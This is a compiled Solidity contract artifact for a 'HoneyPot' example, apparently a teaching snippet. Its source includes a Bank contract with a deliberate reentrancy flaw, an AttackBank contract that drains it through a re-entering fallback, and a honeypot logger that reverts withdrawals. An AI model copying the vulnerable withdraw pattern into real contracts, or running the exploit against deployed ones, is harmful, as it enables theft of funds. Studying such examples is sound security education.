{
  "contractName": "HoneyPot",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_caller",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "_amount",
          "type": "uint256"
        },
        {
          "internalType": "string",
          "name": "_action",
          "type": "string"
        }
      ],
      "name": "log",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "string",
          "name": "_a",
          "type": "string"
        },
        {
          "internalType": "string",
          "name": "_b",
          "type": "string"
        }
      ],
      "name": "equal",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "pure",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506105bb806100206000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c806346bdca9a1461003b578063a1f2e8aa1461006b575b600080fd5b610055600480360381019061005091906102be565b610087565b6040516100629190610351565b60405180910390f35b61008560048036038101906100809190610400565b6100e0565b005b60008160405160200161009a91906104f7565b60405160208183030381529060405280519060200120836040516020016100c191906104f7565b6040516020818303038152906040528051906020012014905092915050565b61011f816040518060400160405280600881526020017f7769746864726177000000000000000000000000000000000000000000000000815250610087565b1561015f576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161015690610565565b60405180910390fd5b505050565b6000604051905090565b600080fd5b600080fd5b600080fd5b600080fd5b6000601f19601f8301169050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b6101cb82610182565b810181811067ffffffffffffffff821117156101ea576101e9610193565b5b80604052505050565b60006101fd610164565b905061020982826101c2565b919050565b600067ffffffffffffffff82111561022957610228610193565b5b61023282610182565b9050602081019050919050565b82818337600083830152505050565b600061026161025c8461020e565b6101f3565b90508281526020810184848401111561027d5761027c61017d565b5b61028884828561023f565b509392505050565b600082601f8301126102a5576102a4610178565b5b81356102b584826020860161024e565b91505092915050565b600080604083850312156102d5576102d461016e565b5b600083013567ffffffffffffffff8111156102f3576102f2610173565b5b6102ff85828601610290565b925050602083013567ffffffffffffffff8111156103205761031f610173565b5b61032c85828601610290565b9150509250929050565b60008115159050919050565b61034b81610336565b82525050565b60006020820190506103666000830184610342565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006103978261036c565b9050919050565b6103a78161038c565b81146103b257600080fd5b50565b6000813590506103c48161039e565b92915050565b6000819050919050565b6103dd816103ca565b81146103e857600080fd5b50565b6000813590506103fa816103d4565b92915050565b6000806000606084860312156104195761041861016e565b5b6000610427868287016103b5565b9350506020610438868287016103eb565b925050604084013567ffffffffffffffff81111561045957610458610173565b5b61046586828701610290565b9150509250925092565b600081519050919050565b600082825260208201905092915050565b60005b838110156104a957808201518184015260208101905061048e565b838111156104b8576000848401525b50505050565b60006104c98261046f565b6104d3818561047a565b93506104e381856020860161048b565b6104ec81610182565b840191505092915050565b6000602082019050818103600083015261051181846104be565b905092915050565b7f6974277320612074726170000000000000000000000000000000000000000000600082015250565b600061054f600b8361047a565b915061055a82610519565b602082019050919050565b6000602082019050818103600083015261057e81610542565b905091905056fea264697066735822122094f54b4ae19eb4ee994a29a27d564978d091c9465c74f9b7fedc86af183588d264736f6c634300080b0033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\ncontract Logger {\n    event Log(address caller, uint amount, string action);\n\n    function log(\n        address _caller,\n        uint _amount,\n        string memory _action\n    ) public {\n        emit Log(_caller, _amount, _action);\n    }\n}\n\ncontract Bank {\n    mapping(address => uint) public balances;\n    Logger logger;\n\n    constructor(Logger _logger) {\n        logger = Logger(_logger);\n    }\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n        logger.log(msg.sender, msg.value, \"deposit\");\n    }\n\n    function withdraw(uint _amount) public {\n        require(_amount <= balances[msg.sender], \"insufficient funds\");\n\n        (bool sent, ) = msg.sender.call{value: _amount}(\"\");\n        require(sent, \"failed to send ether\");\n\n        balances[msg.sender] -= _amount;\n\n        logger.log(msg.sender, _amount, \"withdraw\");\n    }\n}\n\ncontract AttackBank {\n    Bank bank;\n\n    constructor(Bank _bank) {\n        bank = Bank(_bank);\n    }\n\n    fallback() external payable {\n        if (address(bank).balance >= 1 ether) {\n            bank.withdraw(1 ether);\n        }\n    }\n\n    function attack() public payable {\n        bank.deposit{value: 1 ether}();\n        bank.withdraw(1 ether);\n    }\n\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n\ncontract HoneyPot {\n    function log(\n        address _caller,\n        uint _amount,\n        string memory _action\n    ) public {\n        if (equal(_action, \"withdraw\")) {\n            revert(\"it's a trap\");\n        }\n    }\n\n    function equal(string memory _a, string memory _b) public pure returns (bool) {\n        return keccak256(abi.encode(_a)) == keccak256(abi.encode(_b));\n    }\n}",
  "sourcePath": "/Users/mac/Documents/GitHub/CodeSnippets/Solidity/polygon/contracts/Bank.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.11+commit.d7f03943.Emscripten.clang"
  },
  "schemaVersion": "3.4.4",
  "updatedAt": "2021-12-25T14:54:40.634Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}